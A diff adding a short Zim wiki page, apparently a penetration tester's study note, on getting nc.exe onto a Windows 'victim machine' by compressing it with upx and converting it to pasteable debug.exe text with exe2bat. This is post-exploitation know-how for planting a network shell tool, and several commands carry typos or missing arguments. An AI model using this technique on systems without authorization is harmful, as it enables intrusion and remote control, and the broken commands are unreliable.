@@ -1,0 +1,28 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2018-10-06T22:34:01+05:30
+
+====== File Transfer - using nc ======
+Created Saturday 06 October 2018
+
+**There is a 64k byte size limit to files that can be created by debug.exe**
+
+**To send nc.exe from kali to windows:**
+
+**Use PE compression tool such as upx to compress files.**
+Run the following command in kali to compress file:
+
+locate nc.exe | grep binaries
+cp [[/usr/share/windoes-binaries/nc.exe]]
+ls -l nc.exe
+upx -9 nc.exe
+ls -l nc.exe
+
+**Now convert the exe file to txt file. Run the following command in kali:**
+locate exe2bat
+ cp [[/usr/share/windoes-binaries/exe2bat.exe]]
+wine exe2bat.exe nc.exe nc.txt
+head nc.txt
+
+Simply Copy and paste the commands in the victim machine shown by head.txt
+
